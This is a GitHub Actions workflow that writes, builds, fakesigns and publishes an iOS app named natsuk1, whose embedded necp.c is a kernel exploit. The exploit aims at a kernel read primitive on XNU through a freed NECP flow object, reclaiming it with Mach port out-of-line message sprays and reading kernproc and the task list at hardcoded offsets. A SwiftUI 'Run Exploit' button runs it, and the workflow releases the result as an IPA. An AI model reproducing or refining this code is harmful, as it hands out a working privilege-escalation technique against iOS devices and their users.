name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Sanity check existing files
        run: |
          set -euo pipefail
          for f in \
            natsuk1/Helpers/CrashLog.swift \
            natsuk1/Views/RuntimeView.swift \
            natsuk1/Views/CrashLogView.swift ; do
            test -f "$f" || { echo "MISSING: $f"; exit 1; }
          done
          grep -q 'natsuk1-crashlog-v1' natsuk1/natsuk1.swift
          grep -q 'RuntimeView()'         natsuk1/Views/OverviewView.swift
          echo "pre-existing files OK"

      - name: Write OverviewView.swift
        run: |
          cat > natsuk1/Views/OverviewView.swift <<'SWIFT'
          import SwiftUI
          import UIKit

          struct OverviewView: View {
              @EnvironmentObject var state: AppState

              var body: some View {
                  NavigationStack {
                      List {
                          Section {
                              Button {
                                  state.necp_run()
                              } label: {
                                  HStack {
                                      Text("Run Exploit")
                                      Spacer()
                                      if state.running { ProgressView().scaleEffect(0.8) }
                                  }
                              }
                              .disabled(state.running)
                          } header: {
                              Label("Kernel Read Write", systemImage: "cpu")
                          }

                          RuntimeView()
                              .environmentObject(state)

                          Section {
                              LogTerminal(text: state.log.isEmpty ? "Awaiting execution." : state.log)
                          } header: {
                              Label(state.t("Logs", "Логи"), systemImage: "terminal")
                          }

                          Section {
                              Button { UIPasteboard.general.string = state.log } label: {
                                  Text(state.t("Copy All", "Копировать всё"))
                              }.disabled(state.log.isEmpty)
                              Button(role: .destructive) { state.clear() } label: {
                                  Text(state.t("Clear", "Очистить"))
                              }.disabled(state.log.isEmpty)
                          }
                      }
                      .listStyle(.insetGrouped)
                      .navigationTitle("natsuk1")
                      .navigationBarTitleDisplayMode(.inline)
                  }
              }
          }

          struct StatusDot: View {
              let status: AppState.Status
              @State private var pulse = false
              var body: some View {
                  Image(systemName: "circle.fill")
                      .font(.system(size: 14))
                      .foregroundStyle(status.color)
                      .shadow(color: status.color.opacity(0.85), radius: pulse ? 8 : 4)
                      .scaleEffect(pulse ? 1.2 : 1.0)
                      .animation(
                          status == .running
                              ? .easeInOut(duration: 0.8).repeatForever(autoreverses: true)
                              : .default,
                          value: pulse
                      )
                      .onAppear { if status == .running { pulse = true } }
                      .onChange(of: status) { _, s in pulse = (s == .running) }
              }
          }

          struct LogTerminal: View {
              let text: String
              var body: some View {
                  ScrollView {
                      Text(text)
                          .font(.system(size: 10, design: .monospaced))
                          .multilineTextAlignment(.leading)
                          .foregroundStyle(.primary)
                          .frame(maxWidth: .infinity, alignment: .leading)
                  }
                  .frame(minHeight: 200, maxHeight: 400)
              }
          }
          SWIFT

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <pthread.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/vm_map.h>
          #include <mach/vm_region.h>
          #include <mach/message.h>

          #include "nk_api.h"

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif

          #define KBASE 0xFFFFFFF007004000ULL
          #define OFF_KERNPROC 0xBBB040ULL
          #define OFF_TASK_LIST 0x10D53F0ULL
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
          #define SLIDE_FALLBACK 0x3D00000ULL

          #define NECP_ADD_CLIENT  0x01
          #define NECP_COPY_RESULT 0x04
          #define NECP_ADD_FLOW    0x11
          #define NECP_REMOVE_FLOW 0x12
          #define GATE_BYTE        9

          #define NCF_SZ  0x400
          #define NCF_ASN 0x68
          #define NCF_LEN 0x70
          #define NCF_PAR 0x88

          #define RESBUF  8192
          #define NPORTS  64
          #define PERPORT 5

          /* natsuk1-probe-v9 */

          static uint64_t g_kbase;
          static int      g_res_off = -1;

          typedef struct {
              mach_msg_header_t hdr;
              mach_msg_body_t body;
              mach_msg_ool_descriptor_t ool;
          } ool_t;

          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap;
              va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)

          static void dumpw(const char *tag, const uint8_t *p, int n) {
              char line[1024];
              int off = 0;
              if (n > 24) n = 24;
              for (int i = 0; i < n; i++) {
                  uint64_t w;
                  memcpy(&w, p + i * 8, 8);
                  off += snprintf(line + off, sizeof(line) - off,
                                  "%02d:%016llx ", i, (unsigned long long)w);
                  if (off > 900) break;
              }
              LI(tag, "%s", line);
          }

          static volatile int g_qw = 0;

          static mach_port_t port_new(void) {
              mach_port_t p = MACH_PORT_NULL;
              if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p)
                  != KERN_SUCCESS) return MACH_PORT_NULL;
              mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
              mach_port_limits_t lim;
              lim.mpl_qlimit = 4096;
              kern_return_t kr = mach_port_set_attributes(mach_task_self(), p,
                                                          MACH_PORT_LIMITS_INFO,
                                                          (mach_port_info_t)&lim,
                                                          MACH_PORT_LIMITS_INFO_COUNT);
              if (kr != KERN_SUCCESS && !g_qw) {
                  g_qw = 1;
                  LW("PORT", "set_qlimit kr=%d", kr);
              }
              return p;
          }

          typedef struct {
              mach_port_t ports[NPORTS];
              int n;
          } spray_t;

          static void spray_init(spray_t *sp, int want) {
              sp->n = 0;
              if (want > NPORTS) want = NPORTS;
              for (int i = 0; i < want; i++) {
                  mach_port_t p = port_new();
                  if (p == MACH_PORT_NULL) break;
                  sp->ports[sp->n++] = p;
              }
          }

          static int spray_send(spray_t *sp, const void *d, size_t sz) {
              ool_t m;
              int sent = 0;
              for (int i = 0; i < sp->n; i++) {
                  for (int j = 0; j < PERPORT; j++) {
                      memset(&m, 0, sizeof(m));
                      m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
                                       | MACH_MSGH_BITS_COMPLEX;
                      m.hdr.msgh_size = sizeof(m);
                      m.hdr.msgh_remote_port = sp->ports[i];
                      m.hdr.msgh_id = 0x5500 + sent;
                      m.body.msgh_descriptor_count = 1;
                      m.ool.address = (void*)d;
                      m.ool.size = (mach_msg_size_t)sz;
                      m.ool.copy = MACH_MSG_VIRTUAL_COPY;
                      m.ool.deallocate = FALSE;
                      m.ool.type = MACH_MSG_OOL_DESCRIPTOR;
                      if (mach_msg(&m.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                   sizeof(m), 0, MACH_PORT_NULL, 50,
                                   MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
                          sent++;
                      } else break;
                  }
              }
              return sent;
          }

          static void spray_drain(spray_t *sp) {
              uint8_t buf[2048];
              mach_msg_header_t *h = (mach_msg_header_t*)buf;
              for (int i = 0; i < sp->n; i++) {
                  for (int j = 0; j < PERPORT + 4; j++) {
                      h->msgh_size = sizeof(buf);
                      if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                   0, sizeof(buf), sp->ports[i], 1,
                                   MACH_PORT_NULL) != KERN_SUCCESS) break;
                  }
                  mach_port_destroy(mach_task_self(), sp->ports[i]);
              }
              sp->n = 0;
          }

          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }

          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }

          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, (size_t)56);
              if (r == 0) {
                  memcpy(fu, req, 16);
                  fu[GATE_BYTE] |= 0x01;
              }
              return r;
          }

          static int nrm_flow(int fd, const uint8_t fu[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
                                  (void*)fu, (size_t)16, NULL, (size_t)0);
          }

          static int ncpy(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
          }

          /* probe: sweep NECP opcodes with a live client */
          static void probe_actions(void) {
              LI("PROBE", "sweep opcodes 0x00..0x20 on live client");
              int fd = nfd();
              if (fd < 0) { LE("PROBE", "necp_open errno=%d", errno); return; }
              uint8_t cu[16];
              if (nadd_client(fd, cu) != 0) {
                  LE("PROBE", "add_client errno=%d", errno);
                  close(fd);
                  return;
              }
              uint8_t resp[512];
              int hits = 0;
              for (int op = 0; op <= 0x20; op++) {
                  memset(resp, 0, sizeof(resp));
                  errno = 0;
                  int r = (int)syscall(SYS_NECP_ACTION, fd, op,
                                       (void*)cu, (size_t)16,
                                       resp, (size_t)256);
                  int e = errno;
                  LI("PROBE", "op=0x%02x ret=%d errno=%d", op, r, e);
                  if (r > 0 && r <= 256) {
                      hits++;
                      int nw = r / 8;
                      dumpw("PROBE", resp, nw > 6 ? 6 : nw);
                  }
                  usleep(20);
              }
              LI("PROBE", "sweep done, hits=%d", hits);
              close(fd);
          }

          static int trial(uint64_t tgt, uint32_t rd, int aoff, int loff, int poff,
                           uint8_t fill, uint8_t *out, int outsz) {
              uint8_t fake[NCF_SZ];
              memset(fake, fill, sizeof(fake));
              if (aoff >= 0 && aoff + 8 <= NCF_SZ) *(uint64_t*)(fake + aoff) = tgt;
              if (loff >= 0 && loff + 8 <= NCF_SZ) *(uint64_t*)(fake + loff) = rd;
              if (poff >= 0 && poff + 8 <= NCF_SZ) *(uint64_t*)(fake + poff) = 0;
              uint8_t junk[NCF_SZ];
              memset(junk, 0x41, sizeof(junk));
              spray_t ex;
              spray_init(&ex, NPORTS);
              spray_send(&ex, junk, NCF_SZ);
              int fd = nfd();
              if (fd < 0) { spray_drain(&ex); return -1; }
              uint8_t cu[16], fu[16];
              if (nadd_client(fd, cu) != 0 || nadd_flow(fd, cu, fu) != 0) {
                  close(fd); spray_drain(&ex); return -2;
              }
              nrm_flow(fd, fu);
              spray_drain(&ex);
              usleep(200);
              spray_t sp;
              spray_init(&sp, NPORTS);
              spray_send(&sp, fake, NCF_SZ);
              usleep(150);
              memset(out, 0, outsz);
              int ret = ncpy(fd, cu, out, outsz);
              spray_drain(&sp);
              close(fd);
              return ret;
          }

          static int calibrate(void) {
              if (g_res_off >= 0) return 0;
              const uint64_t expect = 0xFFFFFFF00ADEE310ULL;
              LI("CAL", "target=kernproc@0x%llx expect=0x%llx",
                 (unsigned long long)OFF_KERNPROC, (unsigned long long)expect);
              uint8_t b[RESBUF];
              for (int a = 0; a < 6; a++) {
                  errno = 0;
                  int r = trial(g_kbase + OFF_KERNPROC, 8,
                                NCF_ASN, NCF_LEN, NCF_PAR, 0x42,
                                b, sizeof(b));
                  if (r <= 0) {
                      LW("CAL", "a=%d ret=%d errno=%d", a, r, errno);
                      usleep(400);
                      continue;
                  }
                  LI("CAL", "a=%d ret=%d", a, r);
                  dumpw("CAL", b, r / 8 > 16 ? 16 : r / 8);
                  for (int i = 0; i + 8 <= r; i++) {
                      uint64_t v;
                      memcpy(&v, b + i, 8);
                      if (v >= KPTR_MIN && v <= KPTR_MAX) {
                          g_res_off = i;
                          LO("CAL", "a=%d roff=0x%x val=0x%llx %s",
                             a, i, (unsigned long long)v,
                             v == expect ? "MATCH" : "kptr");
                          return 0;
                      }
                  }
                  usleep(400);
              }
              return -1;
          }

          static uint64_t kr64(uint64_t addr) {
              if (g_res_off < 0 && addr != g_kbase + OFF_KERNPROC) {
                  if (calibrate() != 0) return 0;
              }
              uint8_t b[RESBUF];
              int r = trial(addr, 8, NCF_ASN, NCF_LEN, NCF_PAR, 0x42,
                            b, sizeof(b));
              if (r <= 0) return 0;
              int off = g_res_off >= 0 ? g_res_off : 0;
              if (off + 8 > r) return 0;
              uint64_t v;
              memcpy(&v, b + off, 8);
              return v;
          }

          static uint32_t kr32(uint64_t addr) {
              return (uint32_t)(kr64(addr) & 0xFFFFFFFF);
          }

          static int sanity(void) {
              uint64_t kp = kr64(g_kbase + OFF_KERNPROC);
              uint64_t tl = kr64(g_kbase + OFF_TASK_LIST);
              LI("SAN", "kernproc=0x%llx task_list=0x%llx",
                 (unsigned long long)kp, (unsigned long long)tl);
              int ok = 0;
              if (kp >= KPTR_MIN && kp <= KPTR_MAX) ok++;
              if (tl >= KPTR_MIN && tl <= KPTR_MAX) ok++;
              return ok == 2 ? 0 : -1;
          }

          static int task_sanity(void) {
              uint64_t kp = kr64(g_kbase + OFF_KERNPROC);
              if (!kp || kp < KPTR_MIN || kp > KPTR_MAX) return -1;
              uint32_t pid = kr32(kp + 0x74);
              LI("TASK", "kernproc pid=%u (expect 0)", pid);
              return pid == 0 ? 0 : -1;
          }

          static volatile int g_busy = 0;

          static int impl(void) {
              nk_log("");
              nk_log("=== natsuk1 v1.9 (natsuk1-probe-v9) ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("");
              LI("INIT", "NCF_SZ=0x%x NPORTS=%d PER=%d", NCF_SZ, NPORTS, PERPORT);
              g_kbase = KBASE + SLIDE_FALLBACK;
              LO("P1", "kbase=0x%llx", (unsigned long long)g_kbase);

              {
                  int fd = nfd();
                  if (fd < 0) { LE("P2", "necp_open errno=%d", errno); return 1; }
                  close(fd);
                  LO("P2", "necp OK");
              }

              LI("P3", "probe");
              probe_actions();

              LI("P4", "calibrate");
              if (calibrate() != 0) { LE("P4", "failed"); return 1; }
              LO("P4", "kread ready roff=0x%x", g_res_off);

              LI("P5", "sanity");
              if (sanity() != 0) {
                  LE("P5", "sanity failed");
                  return 1;
              }
              if (task_sanity() != 0) LW("P5", "task chain broken");
              else LO("DONE", "kread complete");
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }
          NECP

      - name: Verify
        run: |
          set +e
          fail=0
          chk() { if "$@" >/dev/null 2>&1; then echo "  OK   $1 $2 $3 $4"; else echo "  FAIL $1 $2 $3 $4"; fail=1; fi; }

          F=natsuk1/Views/OverviewView.swift
          N=natsuk1/Exploit/necp.c

          echo "--- OverviewView.swift ---"
          echo "  RuntimeView() count: $(grep -c 'RuntimeView()' "$F")"
          echo "  StatusDot count:     $(grep -c 'struct StatusDot' "$F")"
          echo "  LogTerminal count:   $(grep -c 'struct LogTerminal' "$F")"
          echo "  necp_run() count:    $(grep -c 'state.necp_run()' "$F")"
          chk test "$(grep -c 'RuntimeView()' "$F")" = "1"
          chk test "$(grep -c 'struct StatusDot' "$F")" = "1"
          chk test "$(grep -c 'struct LogTerminal' "$F")" = "1"
          chk test "$(grep -c 'Label(state.t("Runtime"' "$F")" = "0"

          echo "--- necp.c ---"
          echo "  marker: $(grep -c 'natsuk1-probe-v9' "$N")"
          chk test "$(grep -c 'natsuk1-probe-v9' "$N")" = "1"
          chk test "$(grep -c 'static void probe_actions' "$N")" = "1"
          chk test "$(grep -c 'NECP_ADD_CLIENT  0x01' "$N")" = "1"
          chk test "$(grep -c 'int nk_necp_run(void)' "$N")" = "1"
          chk test "$(grep -c 'static int impl(void)' "$N")" = "1"

          echo "--- syntax ---"
          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
          if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
              -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$N" ; then
            echo "  OK   clang syntax"
          else
            echo "  FAIL clang syntax"
            fail=1
          fi

          if [ "$fail" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
          echo "VERIFY OK"

      - name: Install tools
        run: brew install xcodegen ldid || true

      - name: Generate xcodeproj
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
            -sdk iphoneos -destination 'generic/platform=iOS' \
            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES build -quiet

      - name: Package app tarball
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
          tar -czf natsuk1-app.tar.gz -C "$(dirname "$APP_PATH")" "$(basename "$APP_PATH")"

      - name: Upload app artifact
        uses: actions/upload-artifact@v4
        with:
          name: natsuk1-app-tar
          path: natsuk1-app.tar.gz
          if-no-files-found: error
          retention-days: 3

      - name: Package and release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
          gh release create development natsuk1.ipa \
            --target "${GITHUB_SHA}" --title "Development" \
            --prerelease --latest=false \
            --notes "UI: Run Exploit / Runtime / Logs. necp: NECP action sweep 0x00..0x20."

      - name: Commit
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add natsuk1/Views/OverviewView.swift natsuk1/Exploit/necp.c
          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
          git commit -m "UI order + NECP action sweep [skip ci]"
          git push
